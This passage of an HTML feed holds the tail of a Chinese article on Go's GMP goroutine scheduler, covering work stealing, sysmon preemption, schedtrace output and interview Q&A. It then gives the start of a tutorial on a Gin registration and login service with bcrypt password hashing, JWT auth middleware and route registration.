<li>协作式抢占（Go 1.13-）：函数调用时检查抢占标记</li>
<li>基于信号的异步抢占（Go 1.14+）：sysmon 通过信号强制抢占长时间运行的 G</li>
</ul>
</li>
</ol>
<h4 data-id="heading-8">Work Stealing（工作窃取）</h4>
<ul>
<li>当 P 的本地队列为空时，会尝试从以下位置窃取 G：
<ol>
<li>全局队列（需要加锁）</li>
<li>其他 P 的本地队列（窃取一半）</li>
<li>netpoller（检查是否有就绪的网络 IO）</li>
</ol>
</li>
</ul>
<h4 data-id="heading-9">Hand Off（移交）</h4>
<ul>
<li>当 M 因系统调用阻塞时，会将 P 移交给其他空闲或新建的 M</li>
<li>保证 P 的数量始终不变，最大化 CPU 利用率</li>
</ul>
<hr/>
<h2 data-id="heading-10">二、源码关键位置</h2>
<h3 data-id="heading-11">核心文件</h3>
<ul>
<li><code>src/runtime/runtime2.go</code>: G、M、P 结构体定义</li>
<li><code>src/runtime/proc.go</code>: 调度器核心逻辑（schedule、findrunnable、execute 等）</li>
<li><code>src/runtime/asm_*.s</code>: 汇编入口（不同架构）</li>
<li><code>src/runtime/mgc.go</code>: GC 相关</li>
</ul>
<h3 data-id="heading-12">关键函数调用链</h3>
<pre><code class="hljs language-css" lang="css">程序启动:
rt0_go (汇编) 
  -&gt; <span class="hljs-built_in">schedinit</span>() (初始化调度器)
  -&gt; <span class="hljs-built_in">newproc</span>() (创建 main goroutine)
  -&gt; <span class="hljs-built_in">mstart</span>() (启动 M)
  -&gt; <span class="hljs-built_in">schedule</span>() (进入调度循环)

调度循环:
<span class="hljs-built_in">schedule</span>()
  -&gt; <span class="hljs-built_in">findrunnable</span>() (寻找可执行的 G)
  -&gt; <span class="hljs-built_in">execute</span>() (执行 G)
  -&gt; <span class="hljs-built_in">goexit</span>() (G 执行完毕)
  -&gt; <span class="hljs-built_in">schedule</span>() (循环)
</code></pre>
<hr/>
<h2 data-id="heading-13">三、核心数据结构字段详解</h2>
<h3 data-id="heading-14">g 结构体关键字段</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> g <span class="hljs-keyword">struct</span> {
    stack       stack    <span class="hljs-comment">// 栈内存范围 [stack.lo, stack.hi)</span>
    stackguard0 <span class="hljs-type">uintptr</span>  <span class="hljs-comment">// 栈溢出检测</span>
    m           *m       <span class="hljs-comment">// 当前绑定的 M</span>
    sched       gobuf    <span class="hljs-comment">// 调度信息（PC、SP 等寄存器）</span>
    atomicstatus <span class="hljs-type">uint32</span>  <span class="hljs-comment">// 状态（原子操作）</span>
    goid        <span class="hljs-type">int64</span>    <span class="hljs-comment">// goroutine ID</span>
    gopc        <span class="hljs-type">uintptr</span>  <span class="hljs-comment">// 创建此 goroutine 的 PC（用于栈追踪）</span>
    startpc     <span class="hljs-type">uintptr</span>  <span class="hljs-comment">// goroutine 函数的 PC</span>
}
</code></pre>
<h3 data-id="heading-15">m 结构体关键字段</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> m <span class="hljs-keyword">struct</span> {
    g0       *g        <span class="hljs-comment">// 用于执行调度代码的特殊 g（栈更大）</span>
    curg     *g        <span class="hljs-comment">// 当前运行的 G</span>
    p        puintptr  <span class="hljs-comment">// 当前绑定的 P</span>
    nextp    puintptr  <span class="hljs-comment">// 唤醒 M 时，即将绑定的 P</span>
    spinning <span class="hljs-type">bool</span>      <span class="hljs-comment">// 是否正在窃取 G</span>
}
</code></pre>
<h3 data-id="heading-16">p 结构体关键字段</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> p <span class="hljs-keyword">struct</span> {
    status   <span class="hljs-type">uint32</span>      <span class="hljs-comment">// P 的状态</span>
    m        muintptr    <span class="hljs-comment">// 绑定的 M</span>
    runqhead <span class="hljs-type">uint32</span>      <span class="hljs-comment">// 本地队列头</span>
    runqtail <span class="hljs-type">uint32</span>      <span class="hljs-comment">// 本地队列尾</span>
    runq     [<span class="hljs-number">256</span>]guintptr <span class="hljs-comment">// 本地运行队列（循环队列）</span>
    runnext  guintptr    <span class="hljs-comment">// 下一个要运行的 G（优先级最高）</span>
    gFree    *g          <span class="hljs-comment">// 已终止的 G 的缓存列表</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-17">四、核心函数解析</h2>
<h3 data-id="heading-18">1. schedule() - 调度循环入口</h3>
<pre><code class="hljs language-markdown" lang="markdown">职责：找到下一个可运行的 G，并执行它
核心逻辑：
<span class="hljs-bullet">  1.</span> 每调度 61 次，从全局队列拿一个 G（防止全局队列饥饿）
<span class="hljs-bullet">  2.</span> 尝试从 P 的本地队列获取 G
<span class="hljs-bullet">  3.</span> 如果没有，调用 findrunnable() 进行全局搜索
<span class="hljs-bullet">  4.</span> 调用 execute() 执行 G
</code></pre>
<h3 data-id="heading-19">2. findrunnable() - 查找可运行的 G</h3>
<pre><code class="hljs language-markdown" lang="markdown">查找顺序（Work Stealing）：
<span class="hljs-bullet">  1.</span> 本地队列 (runq)
<span class="hljs-bullet">  2.</span> 全局队列 (globrunqget)
<span class="hljs-bullet">  3.</span> netpoller (网络轮询器)
<span class="hljs-bullet">  4.</span> 窃取其他 P 的队列 (stealWork -&gt; runqsteal)
<span class="hljs-bullet">  5.</span> 再次检查全局队列和 netpoller
<span class="hljs-bullet">  6.</span> 如果还是没有，park M（休眠）
</code></pre>
<h3 data-id="heading-20">3. execute() - 执行 G</h3>
<pre><code class="hljs language-scss" lang="scss">职责：
  <span class="hljs-number">1</span>. 将 G 绑定到当前 M
  <span class="hljs-number">2</span>. 将 G 的状态改为 _Grunning
  <span class="hljs-number">3</span>. 调用 <span class="hljs-built_in">gogo</span>() (汇编) 切换到 G 的栈并执行
</code></pre>
<h3 data-id="heading-21">4. sysmon() - 系统监控线程</h3>
<pre><code class="hljs language-markdown" lang="markdown">职责：
<span class="hljs-bullet">  1.</span> 检查长时间运行的 G（&gt;10ms），发送抢占信号
<span class="hljs-bullet">  2.</span> 回收长时间阻塞的 P
<span class="hljs-bullet">  3.</span> 触发强制 GC
<span class="hljs-bullet">  4.</span> 网络轮询器的超时检查
  
抢占机制（Go 1.14+）：
<span class="hljs-bullet">  -</span> 向目标 M 发送 SIGURG 信号
<span class="hljs-bullet">  -</span> M 收到信号后，在信号处理函数中将当前 G 标记为可抢占
<span class="hljs-bullet">  -</span> 在下一次安全点检查抢占标记，切换到 g0 并调用 schedule()
</code></pre>
<hr/>
<h2 data-id="heading-22">五、实战要点</h2>
<h3 data-id="heading-23">GODEBUG=schedtrace 输出解析</h3>
<p>运行命令：</p>
<pre><code class="hljs language-bash" lang="bash">GODEBUG=schedtrace=1000 go run main.go
</code></pre>
<p>输出示例：</p>
<pre><code class="hljs language-ini" lang="ini">SCHED 1000ms: <span class="hljs-attr">gomaxprocs</span>=<span class="hljs-number">8</span> idleprocs=<span class="hljs-number">6</span> threads=<span class="hljs-number">12</span> spinningthreads=<span class="hljs-number">0</span> idlethreads=<span class="hljs-number">5</span> runqueue=<span class="hljs-number">0</span> [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]
</code></pre>
<p>字段含义：</p>
<ul>
<li><code>1000ms</code>: 程序运行时间</li>
<li><code>gomaxprocs=8</code>: P 的数量（GOMAXPROCS）</li>
<li><code>idleprocs=6</code>: 空闲的 P 数量</li>
<li><code>threads=12</code>: 当前 M 的总数</li>
<li><code>spinningthreads=0</code>: 正在窃取任务的 M 数量</li>
<li><code>idlethreads=5</code>: 空闲的 M 数量</li>
<li><code>runqueue=0</code>: 全局队列中的 G 数量</li>
<li><code>[0 0 0 0 0 0 0 0]</code>: 每个 P 的本地队列中的 G 数量</li>
</ul>
<h3 data-id="heading-24">关键观察指标</h3>
<ol>
<li><strong>idleprocs 过高</strong>：说明 CPU 利用率不足，Goroutine 不够或有大量阻塞</li>
<li><strong>spinningthreads &gt; 0</strong>：有 M 在不停窃取，说明存在负载不均衡</li>
<li><strong>runqueue 持续积累</strong>：全局队列有大量待处理的 G，可能有性能瓶颈</li>
<li><strong>某些 P 的 runqueue 特别大</strong>：负载不均，可能某些 Goroutine 创建了过多子任务</li>
</ol>
<hr/>
<h2 data-id="heading-25">六、常见面试题</h2>
<h3 data-id="heading-26">Q1: 为什么需要 P？直接 G-M 不行吗？</h3>
<p>A: P 的存在是为了减少锁竞争。每个 P 有独立的本地队列，避免了所有 M 竞争全局队列的问题。同时 P 可以在 M 阻塞时移交给其他 M，保证并行度。</p>
<h3 data-id="heading-27">Q2: Work Stealing 如何避免一直窃取不到任务导致的自旋？</h3>
<p>A: findrunnable() 会有多轮尝试，如果多次尝试后仍找不到任务，M 会进入 park 状态（休眠），直到有新任务时被唤醒。</p>
<h3 data-id="heading-28">Q3: 什么情况下会创建新的 M？</h3>
<p>A:</p>
<ol>
<li>现有 M 都在执行且有空闲的 P</li>
<li>M 因系统调用阻塞，需要 Hand Off P 时</li>
<li>CGO 调用时（CGO 调用会阻塞 M）</li>
</ol>
<h3 data-id="heading-29">Q4: Goroutine 的栈是如何增长的？</h3>
<p>A: Go 使用分段栈（Segmented Stack，Go 1.2-）或连续栈（Contiguous Stack，Go 1.3+）。栈空间不足时会触发栈拷贝，将旧栈内容拷贝到新的更大的栈空间。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[每日一Go-20、Go语言实战-利用Gin开发用户注册登录功能]]></title>    <link>https://juejin.cn/post/7594103243685904427</link>    <guid>https://juejin.cn/post/7594103243685904427</guid>    <pubDate>2026-01-12T14:48:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594103243685904427" data-draft-id="7594350054090637354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="每日一Go-20、Go语言实战-利用Gin开发用户注册登录功能"/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2026-01-12T14:48:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Coding君"/> <meta itemprop="url" content="https://juejin.cn/user/3393534758231305"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            每日一Go-20、Go语言实战-利用Gin开发用户注册登录功能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3393534758231305/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Coding君
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T14:48:53.000Z" title="Mon Jan 12 2026 14:48:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文综合前面所学的知识，利用Gin开发一个用户注册登录和验证的功能。</p>
<h2 data-id="heading-0">1、项目结构</h2>
<pre><code class="hljs language-sh" lang="sh">$ tree
.
|-- config        &lt;- 配置目录
|   `-- db.go     &lt;- 数据库配置
|-- controllers   &lt;- 控制器目录
|   `-- auth.go   &lt;- 认证控制器
|-- go.mod
|-- go.sum
|-- main.go       &lt;- 程序入口
|-- middlewares   &lt;- 中间件目录
|   `-- auth.go   &lt;- 认证中间件
|-- models        &lt;- 模型目录
|   `-- user.go   &lt;- 用户模型
|-- routers       &lt;- 路由目录
|   |-- auth.go   &lt;- 认证路由
|   `-- init.go   &lt;- 初始化路由注册
`-- utils         &lt;- 工具箱
    `-- jwt.go

6 directories, 10 files
</code></pre>
<h2 data-id="heading-1">2、开始写代码</h2>
<h3 data-id="heading-2">2.1 config/db.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> config
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"log"</span>
    <span class="hljs-string">"os"</span>
    <span class="hljs-string">"time"</span>
    <span class="hljs-string">"gorm.io/driver/mysql"</span>
    <span class="hljs-string">"gorm.io/gorm"</span>
)
<span class="hljs-keyword">var</span> DB *gorm.DB
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ConnectDatabase</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// dsn := "root:123456@tcp(127.0.0.1:3306)/golang_per_day??charset=utf8&amp;parseTime=True&amp;loc=Local&amp;timeout=1000ms"</span>
    dsn := os.Getenv(<span class="hljs-string">"DATABASE_DSN"</span>)
    <span class="hljs-keyword">if</span> dsn == <span class="hljs-string">""</span> {
        <span class="hljs-built_in">panic</span>(<span class="hljs-string">"请在环境变量里配置【DATABASE_DSN】"</span>)
    }
    db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config{})
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        log.Fatal(<span class="hljs-string">"连接接数据库失败："</span>, err)
    }
    log.Println(<span class="hljs-string">"数据库连接成功:"</span>, db)
    sqlDb, err := db.DB()
    <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> {
        sqlDb.SetMaxIdleConns(<span class="hljs-number">10</span>)
        sqlDb.SetMaxOpenConns(<span class="hljs-number">100</span>)
        sqlDb.SetConnMaxLifetime(time.Hour)
    }
    <span class="hljs-comment">// 开启debug模式</span>
    DB = db.Debug()
}
</code></pre>
<h3 data-id="heading-3">2.2 controllers/auth.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> controllers
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"gindemo2/config"</span>
    <span class="hljs-string">"gindemo2/models"</span>
    <span class="hljs-string">"gindemo2/utils"</span>
    <span class="hljs-string">"net/http"</span>
    <span class="hljs-string">"github.com/gin-gonic/gin"</span>
    <span class="hljs-string">"golang.org/x/crypto/bcrypt"</span>
    <span class="hljs-string">"gorm.io/gorm"</span>
)
<span class="hljs-keyword">type</span> inputUser <span class="hljs-keyword">struct</span> {
    Username <span class="hljs-type">string</span> <span class="hljs-string">`json:"username" binding:"required,min=3,max=32"`</span>
    Passwd   <span class="hljs-type">string</span> <span class="hljs-string">`json:"passwd" binding:"required,min=6"`</span>
}
<span class="hljs-comment">// 注册用户</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(c *gin.Context)</span></span> {
    input := inputUser{}
    <span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;input); err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusBadRequest, gin.H{
            <span class="hljs-string">`error`</span>: err.Error(),
        })
        <span class="hljs-keyword">return</span>
    }
    hasedPwd, err := bcrypt.GenerateFromPassword([]<span class="hljs-type">byte</span>(input.Passwd), bcrypt.DefaultCost)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusInternalServerError, gin.H{
            <span class="hljs-string">`error`</span>: <span class="hljs-string">"哈希密码失败"</span>,
        })
        <span class="hljs-keyword">return</span>
    }
    user := models.User{
        Username: input.Username,
        PassWd:   <span class="hljs-type">string</span>(hasedPwd),
    }
    <span class="hljs-keyword">if</span> err := config.DB.Create(&amp;user).Error; err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusInternalServerError, gin.H{<span class="hljs-string">`error`</span>: err.Error()})
        <span class="hljs-keyword">return</span>
    }
    c.JSON(http.StatusOK, gin.H{
        <span class="hljs-string">`message`</span>: <span class="hljs-string">"用户创建成功"</span>,
        <span class="hljs-string">`user`</span>: gin.H{
            <span class="hljs-string">`id`</span>:       user.ID,
            <span class="hljs-string">`username`</span>: user.Username,
        },
    })
}
<span class="hljs-comment">// 登录</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Login</span><span class="hljs-params">(c *gin.Context)</span></span> {
    input := inputUser{}
    <span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;input); err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusBadRequest, gin.H{
            <span class="hljs-string">`error`</span>: err.Error(),
        })
        <span class="hljs-keyword">return</span>
    }
    <span class="hljs-keyword">var</span> user models.User
    err := config.DB.Where(<span class="hljs-string">`username = ?`</span>, input.Username).First(&amp;user).Error
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">if</span> err == gorm.ErrRecordNotFound {
            c.JSON(http.StatusUnauthorized, gin.H{<span class="hljs-string">"error"</span>: <span class="hljs-string">"无效的凭证"</span>})
            <span class="hljs-keyword">return</span>
        }
        c.JSON(http.StatusInternalServerError, gin.H{<span class="hljs-string">"error"</span>: err.Error()})
        <span class="hljs-keyword">return</span>
    }
    err = bcrypt.CompareHashAndPassword([]<span class="hljs-type">byte</span>(user.PassWd), []<span class="hljs-type">byte</span>(input.Passwd))
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusUnauthorized, gin.H{<span class="hljs-string">"error"</span>: <span class="hljs-string">"无效的凭证"</span>})
        <span class="hljs-keyword">return</span>
    }
    token, err := utils.GenerateToken(user.ID)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusInternalServerError, gin.H{<span class="hljs-string">"error"</span>: <span class="hljs-string">"生成token失败"</span>})
        <span class="hljs-keyword">return</span>
    }
    c.JSON(http.StatusOK, gin.H{
        <span class="hljs-string">"message"</span>: <span class="hljs-string">"登录成功"</span>,
        <span class="hljs-string">"token"</span>:   token,
        <span class="hljs-string">"user"</span>: gin.H{
            <span class="hljs-string">"id"</span>:       user.ID,
            <span class="hljs-string">"username"</span>: user.Username,
        },
    })
}
<span class="hljs-comment">// 查询当前登录者的信息</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Me</span><span class="hljs-params">(c *gin.Context)</span></span> {
    <span class="hljs-keyword">var</span> user models.User
    uid := c.GetUint(<span class="hljs-string">`user_id`</span>)
    fmt.Println(<span class="hljs-string">`uid=`</span>, uid)
    err := config.DB.Where(<span class="hljs-string">`id=?`</span>, uid).First(&amp;user).Error
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        c.JSON(http.StatusBadRequest, gin.H{
            <span class="hljs-string">`error`</span>: err.Error(),
        })
        <span class="hljs-keyword">return</span>
    }
    c.JSON(http.StatusOK, gin.H{
        <span class="hljs-string">"message"</span>: <span class="hljs-string">"查询成功"</span>,
        <span class="hljs-string">"user"</span>: gin.H{
            <span class="hljs-string">"id"</span>:       user.ID,
            <span class="hljs-string">"username"</span>: user.Username,
        },
    })
}
</code></pre>
<h3 data-id="heading-4">2.3 middlewares/auth.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> middlewares
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"gindemo2/utils"</span>
    <span class="hljs-string">"net/http"</span>
    <span class="hljs-string">"strings"</span>
    <span class="hljs-string">"github.com/gin-gonic/gin"</span>
)
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">AuthMiddleware</span><span class="hljs-params">()</span></span> gin.HandlerFunc {
    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> {
        authHeader := c.GetHeader(<span class="hljs-string">"Authorization"</span>)
        <span class="hljs-keyword">if</span> authHeader == <span class="hljs-string">""</span> {
            c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{
                <span class="hljs-string">`error`</span>: <span class="hljs-string">"Authorization header 不能为空"</span>,
            })
            <span class="hljs-keyword">return</span>
        }
        parts := strings.Fields(authHeader)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) != <span class="hljs-number">2</span> || strings.ToLower(parts[<span class="hljs-number">0</span>]) != <span class="hljs-string">`bearer`</span> {
            c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{
                <span class="hljs-string">`error`</span>: <span class="hljs-string">"Authorization header 的格式错误，必须是 Bearer {token}"</span>,
            })
            <span class="hljs-keyword">return</span>
        }
        token := parts[<span class="hljs-number">1</span>]
        claims, err := utils.ParseToken(token)
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{
                <span class="hljs-string">`error`</span>:  <span class="hljs-string">"非法token"</span>,
                <span class="hljs-string">`detail`</span>: err.Error(),
            })
            <span class="hljs-keyword">return</span>
        }
        fmt.Println(<span class="hljs-string">`claims=`</span>, claims)
        <span class="hljs-comment">//设定当前登录的用户id，方便传下去</span>
        c.Set(<span class="hljs-string">`user_id`</span>, claims.UserID)
        c.Next()
    }
}
</code></pre>
<h3 data-id="heading-5">2.4 models/user.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> models
<span class="hljs-keyword">import</span> <span class="hljs-string">"gorm.io/gorm"</span>
<span class="hljs-comment">// 用户表</span>
<span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> {
    gorm.Model
    <span class="hljs-comment">// gorm:"uniqueIndex" 是唯一索引，not null表示不为空</span>
    Username <span class="hljs-type">string</span> <span class="hljs-string">`json:"username" gorm:"type:varchar(30);uniqueIndex;not null"`</span>
    <span class="hljs-comment">// json:"-", - 表示不输出到json</span>
    PassWd <span class="hljs-type">string</span> <span class="hljs-string">`json:"-" gorm:"not null"`</span>
}
</code></pre>
<h3 data-id="heading-6">2.5 routers/init.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> routers
<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/gin-gonic/gin"</span>
<span class="hljs-comment">// 定义路由函数</span>
<span class="hljs-keyword">type</span> Router <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*gin.Engine)</span></span>
<span class="hljs-comment">// 这里放所有的路由</span>
<span class="hljs-keyword">var</span> routers = []Router{}
<span class="hljs-comment">// 初始化路由</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitRouter</span><span class="hljs-params">()</span></span> *gin.Engine {
    r := gin.Default()
    <span class="hljs-keyword">for</span> _, route := <span class="hljs-keyword">range</span> routers {
        route(r)
    }
    <span class="hljs-keyword">return</span> r
}
<span class="hljs-comment">// 注册路由通用函数</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RegisterRoute</span><span class="hljs-params">(r ...Router)</span></span> {
    routers = <span class="hljs-built_in">append</span>(routers, r...)
}
</code></pre>
<h3 data-id="heading-7">2.6 routers/auth.go </h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> routers
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"gindemo2/controllers"</span>
    <span class="hljs-string">"gindemo2/middlewares"</span>
    <span class="hljs-string">"github.com/gin-gonic/gin"</span>
)
<span class="hljs-comment">// init()会在程序启动的时候自动运行</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> {
    RegisterRoute(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *gin.Engine)</span></span> {
        <span class="hljs-comment">// 路由分组</span>
        api := e.Group(<span class="hljs-string">"/api/v1"</span>)
        <span class="hljs-comment">// 路由分组</span>
        auth := api.Group(<span class="hljs-string">"/auth"</span>)
        auth.POST(<span class="hljs-string">"/login"</span>, controllers.Login)
        auth.POST(<span class="hljs-string">"/reg"</span>, controllers.Register)
        <span class="hljs-comment">// 路由/api/v1/auth开头的都加上认证</span>
        auth.Use(middlewares.AuthMiddleware())
        {
            auth.GET(<span class="hljs-string">"/me"</span>, controllers.Me)
            <span class="hljs-comment">//其他路由</span>
        }
    })
}
</code></pre>
